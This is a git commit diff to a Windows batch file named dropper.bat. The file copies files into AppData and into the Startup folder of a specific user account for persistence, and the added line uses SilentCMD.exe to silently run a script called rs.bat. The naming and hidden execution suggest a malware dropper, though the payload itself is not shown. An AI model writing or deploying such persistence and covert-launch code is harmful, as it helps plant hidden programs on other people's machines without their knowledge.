3ae73f3b42cff5cfee79c0081310a45087b8d2bb
fauxbot <mevans@outlook.com>
2022-05-28 17:12:10 -0400

    Update dropper.bat

--- dropper.bat
+++ dropper.bat
@@ -1,3 +1,4 @@
 mkdir C:\Users\%USERNAME%\AppData\Roaming\Startup
 xcopy /E /I Startup C:\Users\%USERNAME%\AppData\Roaming\Startup
 copy .\launch.bat "C:\Users\LTLKiosk\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+start C:\Users\%USERNAME%\AppData\Roaming\Startup\SilentCMD.exe C:\Users\%USERNAME%\AppData\Roaming\Startup\rs.bat
